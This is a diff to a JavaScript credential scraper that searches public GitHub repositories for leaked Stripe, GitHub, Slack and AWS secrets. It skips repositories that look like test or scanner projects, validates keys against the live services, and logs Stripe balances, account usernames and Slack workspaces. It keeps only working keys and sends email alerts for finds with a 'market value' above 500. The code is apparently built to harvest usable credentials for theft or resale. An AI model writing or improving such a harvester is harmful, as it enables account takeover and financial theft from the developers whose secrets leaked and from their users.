@@ -101,9 +101,13 @@ class CredentialScraper {
       const uniqueResults = this.removeDuplicates(results);
       console.log(`🧹 Removed ${results.length - uniqueResults.length} duplicates from scan`);
       
-      // Save all results to database
-      await this.saveResults(uniqueResults, searchId);
-      await this.updateSearchStatus(searchId, 'completed', uniqueResults.length);
+      // ONLY save validated live keys
+      const liveKeys = uniqueResults.filter(r => r.validated === true || (r.credential_type === 'aws_key' && r.secret_key));
+      console.log(`🔥 LIVE KEYS: ${liveKeys.length} out of ${uniqueResults.length} total`);
+      
+      // Save only live keys to database
+      await this.saveResults(liveKeys, searchId);
+      await this.updateSearchStatus(searchId, 'completed', liveKeys.length);
 
       // Send email alert for high-value finds
       const highValue = results.filter(r => r.marketValue && r.marketValue >= 500);
@@ -225,35 +229,57 @@ class CredentialScraper {
             const extracted = this.extractCredentials(content);
             
             if (extracted.length > 0) {
-              // AUTO-VALIDATE ALL Stripe/GitHub/Slack keys immediately
+              // ONLY SAVE VALIDATED LIVE KEYS
               const validated = [];
+              
+              // Skip test/example repos entirely
+              const repoName = item.repository.full_name.toLowerCase();
+              if (repoName.includes('test') || repoName.includes('example') || 
+                  repoName.includes('regex') || repoName.includes('scanner') || 
+                  repoName.includes('secret') || repoName.includes('sample') ||
+                  repoName.includes('demo') || repoName.includes('tutorial')) {
+                console.log(`⏭️ Skipped test repo: ${item.repository.full_name}`);
+                continue;
+              }
+              
               for (const cred of extracted) {
-                // Skip test/example repos
-                if (item.repository.full_name.toLowerCase().includes('test') ||
-                    item.repository.full_name.toLowerCase().includes('example') ||
-                    item.repository.full_name.toLowerCase().includes('regex') ||
-                    item.repository.full_name.toLowerCase().includes('scanner') ||
-                    item.repository.full_name.toLowerCase().includes('secret')) {
-                  console.log(`⏭️ Skipped test repo: ${item.repository.full_name}`);
-                  continue;
-                }
-                
-                if (cred.credential_type === 'stripe_key' || cred.credential_type === 'github_token' || cred.credential_type === 'slack_token') {
+                // ONLY validate and save high-value keys
+                if (cred.credential_type === 'stripe_key') {
                   const validation = await this.validateCredential(cred);
                   if (validation.valid === true) {
                     cred.validated = true;
                     cred.validationData = validation;
                     validated.push(cred);
-                    console.log(`✅ LIVE KEY FOUND: ${cred.credential_type} from ${item.repository.full_name}`);
+                    console.log(`✅ LIVE STRIPE: $${validation.balance} - ${item.repository.full_name}`);
                   } else {
-                    console.log(`❌ Dead key skipped: ${cred.credential_type}`);
+                    console.log(`❌ Dead Stripe key skipped`);
                   }
-                } else if (cred.credential_type !== 'private_key' && cred.credential_type !== 'aws_key') {
-                  // Skip private keys and AWS keys (can't validate without secret)
-                  continue;
-                } else {
+                } else if (cred.credential_type === 'github_token') {
+                  const validation = await this.validateCredential(cred);
+                  if (validation.valid === true) {
+                    cred.validated = true;
+                    cred.validationData = validation;
+                    validated.push(cred);
+                    console.log(`✅ LIVE GITHUB: @${validation.username} - ${item.repository.full_name}`);
+                  } else {
+                    console.log(`❌ Dead GitHub token skipped`);
+                  }
+                } else if (cred.credential_type === 'slack_token') {
+                  const validation = await this.validateCredential(cred);
+                  if (validation.valid === true) {
+                    cred.validated = true;
+                    cred.validationData = validation;
+                    validated.push(cred);
+                    console.log(`✅ LIVE SLACK: ${validation.workspace} - ${item.repository.full_name}`);
+                  } else {
+                    console.log(`❌ Dead Slack token skipped`);
+                  }
+                } else if (cred.credential_type === 'aws_key' && cred.secret_key) {
+                  // Only save AWS if we found BOTH keys
                   validated.push(cred);
+                  console.log(`✅ AWS PAIR FOUND: ${item.repository.full_name}`);
                 }
+                // Skip everything else (emails, passwords, etc.)
               }
               
               if (validated.length > 0) {
